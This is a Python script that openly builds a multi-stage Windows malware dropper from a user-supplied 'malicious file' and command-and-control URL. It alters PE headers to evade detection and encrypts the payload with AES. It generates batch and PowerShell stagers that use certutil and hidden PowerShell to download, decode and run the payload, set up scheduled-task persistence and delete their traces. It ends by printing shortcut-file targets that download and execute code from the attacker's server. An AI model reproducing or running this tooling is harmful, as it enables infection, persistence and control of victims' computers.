import os, base64, random, string, argparse, pefile, subprocess, win32com.client, time
from colorama import init
init()
from colorama import Fore, Back, Style

def randomString(stringLength=10):
    return ''.join(random.choice(string.ascii_lowercase) for i in range(stringLength))

def changeMaliciousAtt(malicious_exe,dir_stage_2):
    if not os.path.exists( malicious_exe ):
        print(Fore.RED + 'File dont exist. Bye.')
        exit()
    
    pe = pefile.PE( malicious_exe , fast_load=True)
    print(Fore.YELLOW + 'Changing MajorLinkerVersion')
    pe.OPTIONAL_HEADER.MajorLinkerVersion = 0
    
    print(Fore.YELLOW + 'Changing MinorLinkerVersion')
    pe.OPTIONAL_HEADER.MinorLinkerVersion = 0
    
    print(Fore.YELLOW + 'Changing MajorOperatingSystemVersion')
    pe.OPTIONAL_HEADER.MajorOperatingSystemVersion = 0
    
    print(Fore.YELLOW + 'Changing MinorOperatingSystemVersion')
    pe.OPTIONAL_HEADER.MinorOperatingSystemVersion = 0

    pe.write(filename=dir_stage_2+'/'+'out.exe')
    print('\033[96m'+'New file in '+dir_stage_2+'/'+'out.exe')

AESCRYPT = 'aescrypt.exe'
NAME_TASK_S1 = randomString(1)
URL_CC      = ''
BAT_STAGE1_B64 = randomString(1)+'.b64'
BAT_STAGE1_INSTALL = randomString(1)
RENAMED_BAT_STAGE1_B64 = randomString(1)+'.b64'
RENAMED_FILE_DOWNLOAD_BAT = randomString(1)+'.bat'
PASS_ENCRYPT_MALWARE = randomString(10)
DIR = 'C:\ProgramData\\'+randomString(5)

if __name__ == "__main__":
    
    dir_stage_1 = 'stage_1'
    dir_stage_2 = 'stage_2'
    
    if not os.path.exists(dir_stage_1):
        os.mkdir(dir_stage_1)
    
    if not os.path.exists(dir_stage_2):
        os.mkdir(dir_stage_2)
    
    parser = argparse.ArgumentParser()
    parser.add_argument("-url", help="Your URL that from files will be downloaded", type=str, required = True)
    parser.add_argument("-file", help="Your malicious file to be b64 encoded and encrypted", type=str, required = True)
    args = parser.parse_args()
    
    URL_CC = args.url

    print(Fore.GREEN+"Changing PE headers ... ")
    malicious_exe = args.file
    changeMaliciousAtt(malicious_exe,dir_stage_2)

    print(Fore.GREEN+"Creating script files ... ")
    BAT_FILE = "@ECHO OFF \nSCHTASKS /delete /TN \""+NAME_TASK_S1+"\" /f \nSCHTASKS /delete /TN \""+NAME_TASK_S1+NAME_TASK_S1+"\" /f \npowershell.exe -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('"+URL_CC+"/stage_2/out.exe.b64.aes','"+DIR+"\out.exe.b64.aes') \npowershell.exe -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('"+URL_CC+"/stage_2/aescrypt.exe','"+DIR+"/aescrypt.exe') & "+DIR+"/aescrypt.exe -d -p "+PASS_ENCRYPT_MALWARE+" "+DIR+"\out.exe.b64.aes \ncertutil -decode "+DIR+"\out.exe.b64 "+DIR+"\out.exe  \nSCHTASKS /CREATE /SC MINUTE /TN \""+NAME_TASK_S1+"\" /TR \""+DIR+"\out.exe\" \ndel "+DIR+"\\"+RENAMED_BAT_STAGE1_B64+"\ndel "+DIR+"\\"+RENAMED_FILE_DOWNLOAD_BAT+"\ndel "+DIR+"\out.b64\ndel "+DIR+"\out.cfg\nexit"
    
    BAT_INSTALL = "SCHTASKS /CREATE /SC MINUTE /TN "+NAME_TASK_S1+NAME_TASK_S1+" /TR \"cmd /c rundll32.exe user32.dll,LockWorkStation\" \nSCHTASKS /CREATE /SC MINUTE /TN "+NAME_TASK_S1+" /TR \"cmd /c mkdir "+DIR+" & certutil -urlcache -split -f "+ URL_CC +"/stage_1/"+BAT_STAGE1_B64+" "+DIR+"\\"+RENAMED_BAT_STAGE1_B64+" & certutil -decode "+DIR+"\\"+RENAMED_BAT_STAGE1_B64+" "+DIR+"\\"+RENAMED_FILE_DOWNLOAD_BAT+" & "+DIR+"\\"+RENAMED_FILE_DOWNLOAD_BAT+"\""    
    b64bytes = base64.b64encode(BAT_FILE.encode('UTF-8'))
    BAT_FILE_B64 = str(b64bytes,'UTF-8')
    
    f1 = open(dir_stage_1+'/'+BAT_STAGE1_INSTALL+'.ps1','w')
    f1.write(BAT_INSTALL)
    f1.close()
    
    f3 = open(dir_stage_1+'/'+BAT_STAGE1_INSTALL+'.bat','w')
    f3.write(BAT_INSTALL)
    f3.close()
    
    f2 = open(dir_stage_1+'/'+BAT_STAGE1_B64,'w')
    f2.write(BAT_FILE_B64)
    f2.close()

    print(Fore.GREEN+"Encoding to base64... ")
    
    os.system('certutil -encode '+ dir_stage_2+'/'+'out.exe '+dir_stage_2+'/'+'out.exe.b64')
    time.sleep(2)

    print(Fore.GREEN+"Encrypting with AES... ")
    
    os.system(AESCRYPT+' -e -p '+ PASS_ENCRYPT_MALWARE +' '+dir_stage_2+'/'+'out.exe.b64'  )

    
    os.system('copy '+AESCRYPT + ' '+dir_stage_2  )
    

    LINK_PS = '%comspec% /c "powershell -ep bypass -nop -w hidden -c iex(new-object net.webclient).downloadstring(\''+URL_CC+'/stage_1/'+ BAT_STAGE1_INSTALL+'.ps1\')"'
    LINK_CERTUTIL = '%comspec% /c "certutil -urlcache -split -f '+URL_CC+'/stage_1/'+BAT_STAGE1_INSTALL+'.bat C:\ProgramData\\'+BAT_STAGE1_INSTALL+'.bat & C:\ProgramData\\'+ BAT_STAGE1_INSTALL+'.bat"'
    
    print( Fore.GREEN + "Atention, create a link file with one of this targets: \n"+ 
    Fore.YELLOW+ LINK_PS +'\n'+
    Fore.GREEN+'or\n'+
    Fore.YELLOW+LINK_CERTUTIL)
